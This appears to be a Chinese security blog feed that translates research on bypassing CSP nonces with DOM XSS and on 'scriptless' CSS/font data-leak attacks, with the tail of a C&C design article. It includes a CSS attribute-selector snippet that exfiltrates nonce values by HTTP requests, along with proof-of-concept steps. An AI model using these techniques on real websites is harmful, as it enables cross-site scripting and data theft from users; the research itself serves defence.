结语</strong></h2><p>说了这么多，主要目的是想介绍一下国际先进的恶意软件C&amp;C设计和侦测经验，我们国内的malware不能总纠结于易语言啊VC6.0啊之类的我国特色，也需要向国际靠拢。同样的，我国的安全研究人员也需要国际先进经验，走在攻击者前面。</p><p>C&amp;C的设计和防御一直都是猫鼠游戏，不定期会出现一些大家都没想到的很机智的办法。在侦测C&amp;C服务的过程里，数据科学和机器学习是很重要的工具，C&amp;C的侦测现在越来越多的用到数据方法，在文中大家也看到了，攻击者已经设计出来一些对抗数据分析和机器学习的更高级C&amp;C设计方法，足以看出数据科学在安全领域的重要作用，连攻击者都体会到了。很多C&amp;C服务看似随机，分布也广泛，但是在统计分析上会显示出一些特定规律从而让安全人员发现。没有人可以骗的过统计规律，不是吗？</p><h2 id="0X10-文章来源"><a href="#0X10-文章来源" class="headerlink" title="0X10 文章来源"></a><strong>0X10 文章来源</strong></h2><p><a href="http://www.anquan.us/static/drops/tips-10232.html">http://www.anquan.us/static/drops/tips-10232.html</a></p>]]></content>
    
    
    <categories>
      
      <category>C&amp;C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</title>
    <link href="/2019/03/09/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B6(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/03/09/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B6(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>CSP nonces 在对抗 DOM XSS 方面似乎并没有所谓的奇效。你可以通过几种方法绕过它们。我不知道如何修复，也许不应该修复。</p><blockquote><p>谢谢你的阅读。这篇博文讲述了CSP nonces 的绕过方法，从一些背景开始，接着介绍在几种情况下如何绕过CSP nonces，并以一些评论结束。和往常一样，这篇博文是我对这个主题的个人看法，我很想听听你的看法。</p></blockquote><h2 id="0X01-我与CSP的关系-”错综复杂”"><a href="#0X01-我与CSP的关系-”错综复杂”" class="headerlink" title="0X01 我与CSP的关系,”错综复杂”"></a><strong>0X01 我与CSP的关系,”错综复杂”</strong></h2><p>我以前喜欢Content-Security-Policy。大约在2009年，我曾经非常兴奋。我的兴奋程度很高，我甚至花了很多时间在我的ACS项目中用JavaScript实现CSP（据我所知，这是第一个正在运行的CSP实现&#x2F;原型）。<strong>它支持哈希和白名单</strong>，我真的相信它会很棒！</p><p>但有一天，我的一位来自elhacker.net（WHK）的朋友指出**，使用JSONP可以简单地规避ACS（以及扩展的CSP）**。 他指出，<strong>如果你将包含JSONP端点的主机名列入白名单，那么安全机制就会被破坏</strong>，确实有很多这样的情况，以至于我没有看到解决这个问题的简单方法,我的心碎了</p><p>快进到2015年，Mario Heiderich做了一个很酷的XSS挑战，名为“<a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22">Sh*t，it’s CSP！</a>”，其中的挑战是以最短的有效载荷逃离一个看似安全的CSP。不出所料，JSONP出现了（但也是Angular和Flash）。</p><span id="more"></span><p>然后在2016年终于有一篇名为“CSP Is Dead，Long Live CSP！”的相当受欢迎的论文。在完成了由Miki，Lukas，Sebastian和Artur执行的CSP部署的互联网范围调查之后，WHK和Mario强调了问题。该论文的结论是CSP白名单完全被破坏和无用。我想，至少CSP参加了葬礼。</p><p>然而，并没有那么简单。作为贡献，该论文主张使用CSP nonces 而不是原始的基于白名单的策略，这是CSP新方式的美好未来！</p><p>当首次提出CSP nonces时，我对它们的关注是它们的权限传递似乎非常困难。为了解决这个问题，<strong>2012年的<a href="https://code.google.com/archive/p/dominatrixss-csp/">dominatrixss-csp</a>使得所有动态生成的脚本节点都可以通过使用动态资源过滤器传递脚本的nonces来工作</strong>。这使得nonces 的传递非常简单。因此，本文提出了这种确切的方法，并命名为 strict-dynamic，现在支持用户代理，而不是像dominatrixss-csp那样的运行时脚本。很大的改进。我们得到了一个本地的dominatrixss！</p><p>这种新的CSP风格，<strong>建议完全忽略白名单，并完全依赖于nonces</strong>。虽然CSP nonces的部署比白名单更难（因为它需要在策略的每一页上进行服务器端更改），但它似乎提出了真正的安全性好处，这显然缺乏基于白名单的方法。再一次，今年秋天，我对这种新方法相当乐观。也许有一种方法可以让大多数XSS实际上真的不可触发。也许CSP毕竟不是假的！</p><p>但是这个圣诞节，如果它是来自圣诞老人的一块煤，塞巴斯蒂安莱基斯指出，在我看来，似乎是对CSP nonces的重大打击，几乎完全使CSP对2016年的许多XSS漏洞无效。</p><h2 id="0X02-一个-CSS-CSP-DOM-XSS-three-way"><a href="#0X02-一个-CSS-CSP-DOM-XSS-three-way" class="headerlink" title="0X02 一个 CSS + CSP + DOM XSS three-way"></a><strong>0X02 一个 CSS + CSP + DOM XSS <a href="https://en.oxforddictionaries.com/definition/three-way">three-way</a></strong></h2><p>虽然CSP nonces确实看起来能够抵御15年前的XSS漏洞，<strong>但它们似乎对DOM XSS没那么有效</strong>。为了解释原因，我需要向您展示如今的Web应用程序是如何编写，以及它与2002年的不同之处。</p><p>以前，大多数应用程序逻辑都存在于服务器中，但在过去的十年中，它一直在向客户端移动。<strong>现在有一天，开发Web应用程序的最有效方法是在HTML + JavaScript中编写大部分UI代码</strong>。除了其他方面，<strong>这允许使Web应用程序脱机就绪，并提供对无限供应的强大Web API的访问。</strong></p><p>而现在，新开发的应用程序仍然具有XSS，不同之处在于，<strong>由于很多代码都是用JavaScript动态生成的</strong>，<strong>现在它们都有DOM XSS</strong>。而这些正是CSP nonces无法持续防御的错误类型（至少目前已实施）。</p><p><strong>让我举三个例子（当然是非详尽的列表）DOM XSS漏洞是常见的，单独的CSP nonces无法防御：</strong></p><p>(1)当攻击者可以强制定向到易受攻击的页面时并且有效 payload <strong>不包含在缓存的响应中（因此需要获取）<strong>时会出现</strong>存储型 DOM XSS:</strong>。</p><p>(2)在页面包含第三方HTML代码的地方，例如，</p><pre><code class="hljs">fetch(location.pathName).then(r=&gt;r.text()).then(t=&gt;body.innerHTML=t);</code></pre><p>会出现 DOM XSS 漏洞</p><p>(3)XSS有效负载位于location.hash中,例如，</p><pre><code class="hljs">https://victim/xss#!foo?payload=</code></pre><p>的地方会出现 DOM XSS 漏洞</p><p>为了解释原因，我们需要回到2008年（woooosh！）。早在2008年，Gareth Heyes，David Lindsay和我在Microsoft Bluehat上做了一个小小的演讲，名为<a href="https://docs.google.com/viewer?url=www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt">CSS-The Sexy Assassin</a>。除此之外，我们还展示了一种纯粹使用CSS3选择器读取HTML属性的技术（几个月之后，它被WiSec重新发现并在其25c3谈话 <a href="https://www.youtube.com/watch?v=RNt_e0WR1sc">Attacking Rich Internet Applications</a> 与kuza55 一起呈现）。</p><p>这种攻击的总结是，可以创建一个CSS程序，逐个字符地展示HTML属性的值，只需每次CSS选择器匹配时生成HTTP请求，然后连续重复。如果您还没有看到这个工作，请看看这里。它的工作方式非常简单，它只是创建一个表单的CSS属性选择器：</p><pre><code class="hljs">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;[...]</code></pre><p>然后，一旦我们得到一个匹配，重复:</p><pre><code class="hljs">*[attribute^=&quot;aa&quot;]&#123;background:url(&quot;record?match=aa&quot;)&#125;*[attribute^=&quot;ab&quot;]&#123;background:url(&quot;record?match=ab&quot;)&#125;*[attribute^=&quot;ac&quot;]&#123;background:url(&quot;record?match=ac&quot;)&#125;[...]</code></pre><p>直到它渗透完整的属性。<br>对脚本标记的攻击非常简单。我们需要进行完全相同的攻击，唯一需要注意的是确保脚本标记设置为display：block;</p><p>因此，<strong>我们现在可以使用CSS提取CSP随机数</strong>，我们唯一需要做的就是能够在同一个文档中多次注入。上面给出的DOM XSS的三个例子恰好就是这样。一种在同一文档中多次注入XSS有效 payload 的方法。完美的 three-way。</p><h2 id="0X03-概念验证"><a href="#0X03-概念验证" class="headerlink" title="0X03 概念验证"></a><strong>0X03 概念验证</strong></h2><p>首先，存储型的DOM XSS。这个问题尤其令人不安，因为如果在“新世界”中，开发人员应该用JavaScript编写UI，那么动态内容需要异步地来自服务器。</p><p>我的意思是，如果用HTML + JavaScript编写UI代码，那么用户数据必须来自服务器。虽然此设计模式允许您控制应用程序逐步加载的方式，但它也<strong>使得加载同一文档两次可以每次返回不同的数据</strong>。</p><p>当然，现在的问题是：**如何强制文档加载两次！？当然，使用HTTP缓存！**这正是塞巴斯蒂安今年圣诞节向我们展示的。</p><p><strong>Sebastian解释了CSP nonces 如何与大多数缓存机制不兼容，并提供了一个简单的概念证明来<a href="http://sebastian-lekies.de/csp/attacker.php">证明它</a>。</strong></p><p>1.首先判断漏洞页面是否禁止了浏览器的缓存</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B65.png" alt="此处输入图片的描述"></p><p>2.将触发 DOM XSS 的payload 构造好(点击可触发 DOM XSS 将 nonces 的值获取，通过表单发送到自己控制的另一个页面2)，然后通过 iframe 将漏洞页面0引入到自己的页面1(这边图片中的 CSS 应该是我理解错误，实际不是那段代码，我后续再修改)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B61.png" alt="此处输入图片的描述"></p><p>3.页面1 中的 js 不断向页面2 轮询这个 nonces 的值</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B64.png" alt="此处输入图片的描述"></p><p>4.轮询成功的话，就在页面1 上再动态生成一个 iframe ，iframe 的内容是有DOM XSS 漏洞的页面0，并且动态生成带有 刚刚获取到的 nonce 的 payload </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B62.png" alt="此处输入图片的描述"></p><p>5.这样就能弹窗了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20DOM%20XSS%20%E6%9D%A5%E7%BB%95%E8%BF%87%20CSP%20%E7%9A%84%20nonces%20%E6%9C%BA%E5%88%B63.png" alt="此处输入图片的描述"></p><p>让我向您展示一个示例，让我们从<a href="https://cloud.google.com/appengine/docs/standard/python/getting-started/creating-guestbook">AppEngine入门指南</a>中获取默认的Guestbook示例，并进行<a href="https://github.com/sirdarckcat/appengine-guestbook-python/commit/fc5161df0a6b778471bde879bbc44cb8a9eade59">添加一些</a>AJAX支持和CSP nonces的修改。应用程序很简单，容易受到<a href="https://github.com/sirdarckcat/appengine-guestbook-python/blob/fc5161df0a6b778471bde879bbc44cb8a9eade59/index.html#L92">明显的XSS攻击</a>，但它可以<a href="https://github.com/sirdarckcat/appengine-guestbook-python/blob/fc5161df0a6b778471bde879bbc44cb8a9eade59/guestbook.py#L91">通过CSP nonces来缓解</a>，真的是这样吗</p><blockquote><p>这里的 iframe 由于无法引入，故请读者去看原文</p></blockquote><p>上面的应用程序有一个非常简单的存储型 XSS。只需提交XSS有效负载（例如，<code>&lt;H1&gt; XSS &lt;/ H1&gt;</code>），您就会明白我的意思。但是虽然那里有一个XSS，但由于CSP的现状，你实际上无法执行JavaScript。<br>现在，让我们进行攻击，回顾一下，我们将：</p><p>1.使用CSS属性读取器窃取CSP随机数。<br>2.使用CSP随机数注入XSS有效内容。</p><p>窃取CSP 随机数实际上需要一些服务器端代码来跟踪强制执行。您可以在<a href="https://gist.github.com/sirdarckcat/273b6449824244dee755814e1a8cb97d">此处</a>找到代码，然后单击上面的按钮即可运行代码。</p><p>如果一切正常，单击“注入XSS有效负载”后，您应该已收到 alert。不是很好吗？。在这种情况下，我们使用的缓存是<a href="https://developer.mozilla.org/en-US/docs/Archive/Misc_top_level/Working_with_BFCache">BFCache</a>，因为它是最可靠的，但你可以像Sebastian在<a href="http://sebastian-lekies.de/csp/attacker.php">他的PoC</a>中那样使用传统的HTTP缓存。</p><h2 id="0X04-其他的-DOM-XSS"><a href="#0X04-其他的-DOM-XSS" class="headerlink" title="0X04 其他的 DOM XSS"></a><strong>0X04 其他的 DOM XSS</strong></h2><p>存储型性 DOM XSS并不是CSP nonces中唯一的弱点。塞巴斯蒂安在<a href="http://sebastian-lekies.de/csp/attacker3.php">postMessage</a>上展示了同样的问题。另一个也存在问题的端点是XSS到HTTP “inclusion”。这是一个相当常见的XSS漏洞，它<strong>只是提取一些用户提供的URL并在innerHTML中回显它</strong>。这相当于JavaScript的远程文件包含。该漏洞与其他漏洞完全相同。</p><p>最后，今天的最后一个PoC是location.hash，它也很常见。也许原因是因为IE的怪癖，但许多网站必须使用位置哈希来在单页JavaScript客户端中实现历史和导航。它甚至有一个绰号”<a href="https://stackoverflow.com/questions/3009380/whats-the-shebang-hashbang-in-facebook-and-new-twitter-urls-for">hashbang</a>“。事实上，这是非常普遍的，每个使用jQuery Mobile的网站都默认启用这个”特性”，无论他们喜欢与否。</p><p>从本质上讲，任何使用hashbang进行内部导航的网站都容易受到反射XSS的影响，就好像CSP nonces不存在一样。那太疯狂了！在<a href="https://top-dot-cspnonce-test.appspot.com/exploit?reset=1">这里</a>查看PoC（仅限Chrome浏览器 -  Firefox转义位置.hash）。</p><h2 id="0X05-结论"><a href="#0X05-结论" class="headerlink" title="0X05 结论"></a><strong>0X05 结论</strong></h2><p>哇，这是一篇很长的博文…但至少我希望你发现它很有用，希望现在你能够更好地理解CSP的真正有效性，也许可以学习一些浏览器技巧，并希望得到一些想法用于未来的研究。</p><ul><li>CSP是否可以防止一些漏洞？应该是！我认为GOBBLES在2002年报告的所有错误都应该可以通过CSP nonces来预防。</li><li>CSP是灵丹妙药吗？不，绝对不是。它的覆盖范围和有效性比我们（或至少我）最初认为的更脆弱。</li></ul><p><strong>我们将何去何从？</strong></p><p>1.我们可以尝试在运行时锁定CSP，正如Devdatta所提出的那样。<br>2.我们可以禁止CSS3属性选择器来读取nonce属性。<br>3.我们可以放弃CSP。</p><h2 id="0X06原文链接"><a href="#0X06原文链接" class="headerlink" title="0X06原文链接"></a>0X06原文链接</h2><p><a href="http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html">http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无脚本攻击 - 在不触碰窗台的情况下偷取馅饼(半机翻有删增)</title>
    <link href="/2019/03/08/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%20-%20%E5%9C%A8%E4%B8%8D%E8%A7%A6%E7%A2%B0%E7%AA%97%E5%8F%B0%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%81%B7%E5%8F%96%E9%A6%85%E9%A5%BC(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/03/08/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%20-%20%E5%9C%A8%E4%B8%8D%E8%A7%A6%E7%A2%B0%E7%AA%97%E5%8F%B0%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%81%B7%E5%8F%96%E9%A6%85%E9%A5%BC(%E5%8D%8A%E6%9C%BA%E7%BF%BB%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>由于其高实际影响，跨站点脚本（XSS）攻击引起了安全社区成员的广泛关注。同样，提出了过多或多或少有效的防御技术，解决了XSS漏洞的原因和影响。因此，攻击者通常无法在多个现实场景中注入甚至执行任意脚本代码。</p><p>在本文中，我们研究了在XSS之后仍然存在的攻击面，并且通过阻止攻击者执行JavaScript代码来减少类似的脚本攻击。我们解决了攻击者是否真的需要JavaScript或类似功能来执行针对信息窃取的攻击的问题。令人惊讶的结果是**，攻击者还可以滥用层叠样式表（CSS）与其他Web技术（如纯HTML，非活动SVG图像或字体文件）一起使用**。通过几个案例研究，<strong>我们引入了所谓的无脚本攻击</strong>，并证明攻击者可能不需要执行代码从受到良来好保护的网站中提取敏感信息。更确切地说，<strong>我们表明攻击者可以使用看似良性的功能来构建侧通道攻击</strong>，以测量和泄露给定网站上显示的几乎任意数据。</p><p>我们在本文结束时讨论了针对此类攻击的潜在缓解技术。此外，我们还实施了一个浏览器补丁，使网站能够做出关于在分离视图或弹出窗口中加载的重要决定。这种方法证明对于防止我们在此讨论的某些类型的攻击很有用。</p><span id="more"></span><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><p>在Web 2.0技术和云计算时代，我们可以使用丰富的强大在线应用程序。这些Web应用程序允许诸如在线银行，在线商店发起商业交易，撰写可能包含敏感信息的电子邮件，甚至在线管理个人医疗记录等活动。因此，很自然地想知道保护此类数据需要采取何种措施，特别是在安全和隐私问题方面。</p><p>突出的现实攻击向量是跨站点脚本（XSS），一种注入攻击**，其中攻击者将恶意脚本注入到其他良性（和可信）网站**。具体来说，XSS为攻击者提供了在脚本的帮助下跨不同站点操作Web页面的选项。对于这种攻击，JavaScript通常被用作选择的语言;一旦恶意脚本执行，它就可以完全访问属于受信任网站的所有资源（例如，cookie，身份验证令牌，CSRF令牌）。由于其高实际影响，XSS攻击和相关的浏览器安全研究近年来引起了安全界的广泛关注。</p><h3 id="通过防止代码的可执行性来防止XSS"><a href="#通过防止代码的可执行性来防止XSS" class="headerlink" title="通过防止代码的可执行性来防止XSS"></a><strong>通过防止代码的可执行性来防止XSS</strong></h3><p>根据上述发展和公布的工作，已经提出了许多或多或少可行的防御技术。所有这些尝试都有一个明确的目标：停止XSS攻击。通常，可以说如果攻击者设法在目标域上执行JavaScript，那么她可以控制受害者导航的整个网页。因此，<strong>建议的缓解策略是出于安全原因停用&#x2F;限制JavaScript代码执行</strong>，使用NoScript ，内容安全策略（CSP）等工具，或者使用HTML5-sandboxed iframe。**如果应用程序可以在没有外部JavaScript的情况下运行，那么这种方法是合理的，**而现代Web 2.0应用程序并不总是如此。此外，一个网站增强了其健壮性并提升了防御攻击的保护级别(这种行为的一个例子是破坏框架的代码，以减轻经典的点击劫持攻击).结果，限制或禁用JavaScript同步禁用上述保护机制。</p><p><strong>回过头来看，我们注意到XSS攻击需要满足三个保证其成功的先决条件：</strong></p><p>1.可注射性：攻击者必须能够将数据注入Web浏览器呈现的文档对象模型（DOM）中<br>2.可执行性：如果注入了JavaScript（或任何其他代码），则必须执行它。<br>3.穿透能力：<strong>攻击者获取的数据必须传递到另一个域或资源，以便进一步分析和利用。</strong></p><p>事实上，XSS最近取代了SQL注入和相关的服务器端注入攻击，成为OWASP排名中的头号威胁，这表明许多Web应用程序都满足了这三个前提条件。如上所述，<strong>针对XSS的若干当前缓解方法集中于第二前提条件</strong>，主要是因为<strong>可注入性通常是许多Web2.0应用中的期望特征</strong>。鼓励互联网用户通过DOM越来越多地使用DOM来贡献不同Web应用程序之间的内容和数据交换。因此，服务器端和客户端XSS过滤器尝试从注入的内容中删除脚本，或者，他们尝试以不在浏览器的DOM中执行的方式修改&#x2F;替换这些脚本。典型的建议是：如果我们成功地防止注入JavaScript被反射或执行，可以认为Web应用程序可以抵御XSS攻击。</p><p>请注意，浏览器的呈现引擎通常用于其他工具，例如电子邮件客户端或即时消息程序，以显示HTML内容。默认情况下，在这些类型的软件中禁用脚本以防止在电子邮件处理或即时消息传递的上下文中发生XSS等攻击。同样，防御方法是通过防止第二个前提条件发生来缓和攻击。</p><h3 id="超越基于脚本的攻击"><a href="#超越基于脚本的攻击" class="headerlink" title="超越基于脚本的攻击"></a><strong>超越基于脚本的攻击</strong></h3><p>在本文中，我们通过在实践中检查来评估限制脚本内容是否足以用于减轻攻击。我们提出攻击者实际上需要JavaScript（或其他语言）来执行XSS攻击的问题。我们在整篇论文中使用的攻击模型如下。<strong>首先，我们假设前提条件1仍然满足</strong>，这在如上所述的现代Web应用程序中是合理的。<strong>其次，我们假设脚本完全禁用，因此我们可以确定XSS攻击不起作用，因为不能满足可执行性的前提条件</strong>（即，不会执行JavaScript内容）。前提条件3由绝大多数Web应用程序授予，因为需要进行大量工作以确保应用程序本身阻止对任意外部域的HTTP请求。</p><p>值得注意的是，<strong>这种攻击模型可以让攻击者将任意标记（如层叠样式表（CSS）标记）注入网站</strong>。我们表明CSS标记（传统上被认为仅用于装饰&#x2F;显示目的）实际上使攻击者能够执行恶意活动。更准确地说，**我们证明了攻击者可以将CSS与其他Web技术结合使用，例如非活动SVG图像，字体文件，HTTP请求和普通非活动HTML，这些都可以实现类似JavaScript的部分行为。**因此，攻击者可以从指定站点窃取敏感数据，包括密码。对于这项工作，我们的运行示例是一个Web应用程序，其中包含用于输入信用卡信息的表单。我们介绍了几种我们称之为无脚本攻击的新型攻击，<strong>因为攻击者可以通过向此页面注入标记来获取信用卡号，而无需依赖任何类型的（JavaScript）代码执行</strong>。我们提出了几种概念验证无脚本攻击，其复杂程度越来越高，说明了我们技术的实际可行性。</p><p>所讨论的攻击都不依赖于受害者的用户交互，而是使用良性HTML，CSS和Web开放字体格式（WOFF）功能的组合，结合基于HTTP请求的侧通道来测量和渗透几乎任意网站上显示的数据。</p><p>必须强调的是，旨在防止XSS的传统服务器和客户端防御机制（如HTMLPurifier，NoScript或其他几种经过测试的XSS过滤解决方案）尚未完全准备好应对我们的无脚本攻击。这主要是因为我们不依赖于注入脚本或执行代码。<br>作为进一步的贡献，我们提出了针对这种新型攻击的新保护机制。由于攻击媒介的过滤可能会影响网站的常规内容，因此我们专注于消除可以执行提议的攻击的条件，从根本上防止对攻击者服务器的请求。我们已经实现了一个浏览器补丁，它为网站提供了一个能力，可以确定它是在分离视图还是弹出窗口中加载。这种方法证明对于防止某些类型的无脚本攻击和其他攻击向量是有用的。</p><h3 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a><strong>贡献</strong></h3><p><strong>总之，我们在本文中做出以下三点贡献：</strong></p><ul><li><p>我们描述了一种攻击面，该攻击面是由现代Web应用程序中不受信任内容的脚本功能划分而产生的。我们将展示攻击者如何在严格受限的执行环境中部署恶意代码。我们将此类攻击标记为无脚本因为它们不需要执行（JavaScript）代码。</p></li><li><p>我们讨论了几个新颖的攻击向量，这些向量足够复杂，可以从给定的网站中提取敏感数据（我们的运行示例涉及获取信用卡号），这样做无需执行脚本代码**。攻击利用一系列良性特征，这些特征组合在一起会产生导致数据泄漏的攻击向量**。我们证明了专有功能以及W3C标准化浏览器功能可用于连接无害功能，以充当强大而强大的侧通道攻击。<strong>所描述的攻击涉及跨站请求伪造（CSRF）和保护CSP</strong>，它们适用于泄漏给定网站上显示的几乎任意数据。**此外，我们将Web和SVG字体识别为强大的工具，用于帮助攻击者从注入的网站获取和泄露敏感数据。**我们已经为所有攻击实施了概念验证示例。</p></li><li><p>我们详细阐述了针对无脚本攻击的现有防御机制，特别是指内容安全策略（CSP）等保护技术。遗憾的是，我们还确定了基于CSP的保护方面的差距，并涵盖了X-Frame-Options标题在无脚本攻击方面的局限性。此外，我们引入了一个新的浏览器功能，我们已经为Firefox浏览器实现了一种补丁形式，有助于减轻无脚本攻击。作为额外的结果，此功能还可以帮助缓解其他几种攻击技术，例如双击顶点和拖放攻击。</p></li></ul><h2 id="攻击面和场景"><a href="#攻击面和场景" class="headerlink" title="攻击面和场景"></a><strong>攻击面和场景</strong></h2><p>在过去几年中，随着许多新的复杂技术的引入，防止对Web应用程序的攻击，成功攻击的标准得到了显着提升。我们推测这主要是由于大量已发布的漏洞利用，与HTML5相关的技术的兴起，以及非浏览器环境中HTML使用的日益普及，即浏览器的渲染引擎被广泛使用诸如Pidgin和Skype等即时通讯工具，Outlook，Thunderbird和Opera Mail等电子邮件客户端，娱乐硬件和软件以及最终操作系统（如Windows8）等环境。因此，所有这些环境都需要保护基于HTML的攻击。这导致了许多防御方法的稳步发展。另外值得注意的是，安装NoScript等安全扩展的用户数量正在增长：NoScript通过简单地禁止JavaScript执行来阻止对网站用户的大范围攻击。因此，针对Web应用程序的攻击变得更加困难，并且部署最新防御技术的网站已经可以抵抗大量攻击媒介。</p><p>鉴于所有这些防御策略，<strong>我们希望攻击者能够发展为在渲染上下文中起作用的技术，这些上下文不允许脚本执行或严重限制已执行脚本的功能</strong>。</p><p>例如，<strong>HTML5建议将沙盒的iframe用于不受信任的内容</strong>;这些本质上限制了脚本执行，直到完全阻止它，它们将成为未来Web应用程序的关键信任令牌。因此可以想到一个非常基本的问题：对手是否仍然可以在这种受限制的环境中执行恶意计算？</p><p>一个持续可行的攻击场景是开发通过（ab）<strong>使用看似良性的特征并将它们连接成实际攻击向量来跨域检索和泄漏数据的技术</strong>。我们假设这些情景在未来将变得重要，因为上面讨论的一些防御技术继续增长。此处引入的攻击基于这种“可注入”的精确方法和目标系统，但<strong>它们无法执行任何JavaScript（或其他语言）代码</strong>。因此，<strong>我们称我们的方法无脚本攻击</strong>。在创建这些攻击期间，我们的目标是实现类似于传统XSS攻击的数据泄漏。</p><p>以下列表简要描述了在浏览器或类似浏览器的软件中使用HTML的一些场景，但出于安全和&#x2F;或隐私原因，JavaScript受到限制或完全禁用。我们的攻击技术针对这些情况，因为即使在如此严格受限的环境中，无脚本攻击还是能导致信息泄露</p><h3 id="1-HTML5-Iframe-沙箱"><a href="#1-HTML5-Iframe-沙箱" class="headerlink" title="1.HTML5 Iframe 沙箱:"></a><strong>1.HTML5 Iframe 沙箱:</strong></h3><p>HTML规范描述了一种功能，该功能允许网站构建任意数据，而不会使其执行脚本和类似的活动内容。<strong>只需应用具有沙箱属性的iframe元素即可调用所谓的iframe沙箱</strong>。默认情况下，沙箱是严格的，并阻止执行任何活动内容，表单功能，定位不同视图和插件容器的链接。可以通过向该属性内容添加以空格分隔的值来放宽限制。因此，使用这些设置，开发人员可以例如允许编写脚本但禁止访问父框架，允许表单功能或允许弹出窗口和模式对话框。虽然沙盒的iframe目前仅在Google Chrome和Microsoft Internet Explorer中可用，但我们预测它们会被广泛采用，因为所述功能会出现在HTML5规范中。早期版本的Internet Explorer中提供了标记为安全限制的iframe的沙盒Iframe的简化版本，例如在MSIE 6.0中。</p><h3 id="2-内容安全策略-CSP"><a href="#2-内容安全策略-CSP" class="headerlink" title="2.内容安全策略 (CSP):"></a><strong>2.内容安全策略 (CSP):</strong></h3><p>内容安全策略是一种提议且积极开发的隐私和安全工具。具体来说，它可以在Mozilla Firefox和Google Chrome浏览器中使用。 CSP的目的是基于HTTP头和元元素限制所讨论的网站的内容使用;例如，开发人员可以指示用户代理忽略内联脚本，跨域资源，事件处理程序，插件数据以及Web字体等可比较资源。在第4节中，我们将讨论当前状态下的CSP如何帮助减轻第3节中引入的攻击。</p><h3 id="3-NoScript和类似的脚本拦截器："><a href="#3-NoScript和类似的脚本拦截器：" class="headerlink" title="3.NoScript和类似的脚本拦截器："></a><strong>3.NoScript和类似的脚本拦截器：</strong></h3><p>NoScript是由Maone，G组成和维护的相当流行的Firefox扩展。除了与此工作无关的几个功能之外，<strong>NoScript的目的是阻止访问过的网站上的不受信任的脚本内容。</strong></p><p>通常，除了少数可信的默认来源之外的所有脚本和内容源都被阻止。特定用户可以临时或以永久方式决定是否信任内容源并启用它。</p><p>NoScript属于我们的研究范围：我们试图绕过其保护并获得执行恶意代码的能力，尽管它存在。让我们强调，无脚本攻击已被证明对此目的非常有效。</p><h3 id="4-客户端-XSS-过滤器"><a href="#4-客户端-XSS-过滤器" class="headerlink" title="4.客户端 XSS 过滤器"></a><strong>4.客户端 XSS 过滤器</strong></h3><p>多个用户代理提供集成的XSS过滤器。这适用于Microsoft Internet Explorer和Google Chrome以及安装了NoScript扩展程序的Firefox**。我们的无脚本攻击旨在绕过这些过滤器并执行恶意代码**，尽管它们存在。在几个例子中，我们能够实现我们的目标，尽管过滤器检测到攻击并阻止脚本执行反应。</p><h3 id="5-电子邮件客户端和即时消息："><a href="#5-电子邮件客户端和即时消息：" class="headerlink" 